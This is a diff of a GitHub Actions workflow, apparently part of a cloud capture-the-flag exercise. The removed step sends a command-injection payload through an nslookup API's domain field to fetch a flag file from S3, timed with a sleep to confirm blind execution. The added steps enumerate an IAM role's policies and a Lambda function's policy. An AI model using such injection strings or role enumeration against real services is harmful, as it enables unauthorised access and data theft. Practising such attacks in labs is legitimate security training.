@@ -1,4 +1,4 @@
-name: Stage2-12-Read-Flag-Test
+name: Stage2-13-Inspect-LambdaRole
 
 on:
   push:
@@ -10,7 +10,7 @@ permissions:
   id-token: write
 
 jobs:
-  test:
+  inspect:
     runs-on: ubuntu-latest
 
     steps:
@@ -20,51 +20,27 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Install dependencies
+      - name: Inspect lambdaRole
         run: |
-          python3 -m pip install requests requests-aws4auth --quiet
+          aws sts get-caller-identity
 
-      - name: Test flag read permission
+          echo "===== ROLE ====="
+          aws iam get-role \
+            --role-name lambdaRole \
+            --output json || true
+
+          echo "===== ATTACHED POLICIES ====="
+          aws iam list-attached-role-policies \
+            --role-name lambdaRole \
+            --output json || true
+
+          echo "===== INLINE POLICIES ====="
+          aws iam list-role-policies \
+            --role-name lambdaRole \
+            --output json || true
+
+      - name: Inspect function policy
         run: |
-          python3 - <<'PY'
-          import os
-          import time
-          import requests
-          from requests_aws4auth import AWS4Auth
-
-          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
-
-          auth = AWS4Auth(
-              os.environ["AWS_ACCESS_KEY_ID"],
-              os.environ["AWS_SECRET_ACCESS_KEY"],
-              "us-east-1",
-              "execute-api",
-              session_token=os.environ["AWS_SESSION_TOKEN"]
-          )
-
-          domain = (
-              "example.com; "
-              "/opt/aws s3api get-object "
-              "--bucket userad88e2b168aa387e "
-              "--key flag.txt "
-              "/tmp/flag.txt "
-              "--region us-east-1 "
-              "--endpoint-url https://s3.us-east-1.amazonaws.com "
-              ">/tmp/aws_result 2>&1 && sleep 5"
-          )
-
-          start = time.monotonic()
-
-          response = requests.post(
-              api,
-              json={"domain": domain},
-              auth=auth,
-              timeout=20
-          )
-
-          elapsed = time.monotonic() - start
-
-          print("HTTP=" + str(response.status_code))
-          print("ELAPSED=%.2f" % elapsed)
-          print(response.text)
-          PY
+          aws lambda get-policy \
+            --function-name nslookupv2 \
+            --output json || true
